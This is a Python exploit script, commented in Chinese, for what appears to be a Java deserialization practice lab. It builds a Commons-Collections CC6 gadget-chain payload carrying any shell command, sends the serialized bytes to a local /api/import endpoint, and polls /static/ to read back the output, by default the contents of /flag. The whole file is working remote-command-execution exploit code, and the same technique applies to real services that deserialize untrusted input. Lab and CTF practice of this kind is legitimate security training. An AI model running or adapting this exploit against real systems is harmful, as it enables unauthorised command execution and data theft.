#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Java 反序列化靶场 —— CC6 利用脚本（纯标准库，零依赖）

用法:
    python3 java_exp.py                     # 默认: cat /flag > /tmp/out/flag.txt
    python3 java_exp.py "id"                # 自定义命令（输出请自己重定向到 /tmp/out/）

流程:
    1. 在容器里跑 Cc6Gen，拿到 base64 的序列化字节流
    2. 原样 POST 到 /api/import
    3. 从 /static/<文件名> 取回命令输出
"""

import base64
import re
import subprocess
import sys
import time
import urllib.request

BASE = 'http://127.0.0.1:8892'
CONTAINER = 'deser-java'
CP = '/app/classes:/app/lib/commons-collections-3.1.jar'
FLAG_RE = re.compile(r'FLAG\{[^}\n]+\}')


def gen_payload(command):
    """调用容器里的 Cc6Gen，返回原始序列化字节。"""
    out = subprocess.run(
        ['docker', 'exec', CONTAINER, 'java', '-cp', CP, 'Cc6Gen', command],
        capture_output=True, text=True)
    b64 = out.stdout.strip()
    if not b64:
        raise RuntimeError('Cc6Gen 失败: ' + out.stderr.strip())
    return base64.b64decode(b64)


def post(blob):
    req = urllib.request.Request(BASE + '/api/import', data=blob, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return 'HTTP %s: %s' % (e.code, e.read().decode('utf-8', 'replace'))


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=10) as r:
        return r.read().decode('utf-8', 'replace')


def get_settled(path, tries=20, delay=0.1):
    """轮询到文件有内容为止。

    为什么要这样：命令形如 `cat /flag > /tmp/out/flag.txt`，shell 会先
    打开文件并截断（变 0 字节），再写入内容。POST 返回后立刻 GET，
    有概率正好命中「已创建但还没写完」的窗口，读到空串。
    这不是靶场的问题，是重定向本身的时序。
    """
    text = ''
    for _ in range(tries):
        text = get(path)
        if text.strip():
            return text
        time.sleep(delay)
    return text


def main():
    command = sys.argv[1] if len(sys.argv) > 1 else 'cat /flag > /tmp/out/flag.txt'
    outfile = 'flag.txt'
    if '>' in command:
        outfile = command.split('>')[-1].strip().split('/')[-1]

    print('[1] 生成 CC6 payload（命令: %s）' % command)
    blob = gen_payload(command)
    print('    序列化长度 %d 字节，前 8 字节: %s' % (len(blob), blob[:8].hex()))

    print('[2] POST 到 /api/import（裸字节）')
    print('    ' + post(blob).strip())

    print('[3] 取命令输出 /static/%s' % outfile)
    text = get_settled('/static/' + outfile)
    print('    ' + text.strip())

    m = FLAG_RE.search(text)
    print('\n结果: %s' % (m.group(0) if m else '未拿到 flag'))
    return 0 if m else 1


if __name__ == '__main__':
    sys.exit(main())
